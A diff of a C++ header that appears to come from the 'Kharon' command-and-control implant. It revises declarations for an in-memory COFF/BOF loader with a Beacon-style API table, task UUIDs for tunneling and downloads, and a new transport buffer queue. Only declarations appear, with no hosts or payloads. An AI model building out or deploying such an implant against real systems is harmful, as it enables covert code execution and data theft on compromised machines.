@@ -1092,7 +1092,7 @@ public:
         ApiTable[35] = { Hsh::Str("BeaconInformation"), reinterpret_cast<PVOID>(&Coff::Information) },
     };
 
-    auto Add( PVOID MmBegin, PVOID MmEnd, CHAR* UUID, ULONG CmdID, PVOID Entry ) -> BOF_OBJ*;
+    auto Add( PVOID MmBegin, PVOID MmEnd, PVOID Entry ) -> BOF_OBJ*;
     auto GetTask( PVOID Address ) -> CHAR*;
     auto GetCmdID( PVOID Address ) -> ULONG;
     auto Rm( BOF_OBJ* Obj ) -> BOOL;
@@ -1101,13 +1101,11 @@ public:
     auto RslApi( _In_ PCHAR SymName ) -> PVOID;
 
     auto Loader( 
-        _In_ BYTE* Buffer, _In_ ULONG Size, _In_ BYTE* Args, 
-        _In_ ULONG Argc, _In_ CHAR* UUID, _In_ ULONG CmdID
+        _In_ BYTE* Buffer, _In_ ULONG Size, _In_ BYTE* Args, _In_ ULONG Argc
     ) -> BOOL;
 
     auto Execute(
-        _In_ COFF_MAPPED* Mapped, _In_ BYTE* Args, 
-        _In_ ULONG Argc, _In_ CHAR* UUID, _In_ ULONG CmdID 
+        _In_ COFF_MAPPED* Mapped, _In_ BYTE* Args, _In_ ULONG Argc
     ) -> BOOL;
 
     auto FindSymbol( _In_ COFF_MAPPED* Mapped, _In_ PCHAR SymName ) -> PVOID;
@@ -1231,7 +1229,6 @@ public:
 
     CHAR TunnelUUID[37]   = "00000000-0000-0000-0000-000000000001"; 
     CHAR DownloadUUID[37] = "00000000-0000-0000-0000-000000000002";
-    CHAR PostexUUID[37]   = "00000000-0000-0000-0000-000000000003"; 
 
     CHAR* CurrentUUID  = nullptr;
     ULONG CurrentCmdId = 0;
@@ -1282,6 +1279,12 @@ public:
     Package( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
     PACKAGE* Shared = nullptr;
+
+    TRANSPORT_NODE* QueueHead  = nullptr;
+    ULONG           QueueCount = 0;
+
+    auto Enqueue( _In_ PVOID Buffer, _In_ ULONG Length ) -> VOID;
+    auto FlushQueue( VOID ) -> VOID;
 
     auto Base64( _In_ const PVOID in, _In_ SIZE_T inlen, _Out_opt_ PVOID  out, _In_opt_ SIZE_T outlen, _In_ Base64Action Action  ) -> SIZE_T;
     auto Base32( _In_ const PVOID in, _In_ SIZE_T inlen, _Out_opt_ PVOID out, _In_opt_ SIZE_T outlen, _In_ Base32Action Action ) -> SIZE_T;
@@ -1335,15 +1338,21 @@ public:
     auto Wstr( _In_ PPARSER parser, _In_ ULONG* size ) -> PWCHAR;
 };
 
-struct _HTTP_DATA {
+struct _TRANSPORT_NODE {
+    PVOID Buffer;
+    ULONG Length;
 
+    struct _TRANSPORT_NODE* Next;
 };
+typedef _TRANSPORT_NODE TRANSPORT_NODE;
 
 class Transport {    
 private:
     Root::Kharon* Self;
 public:
     Transport( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
+
+    TRANSPORT_NODE* Node;
 
     struct {
         CHAR*  FileID;
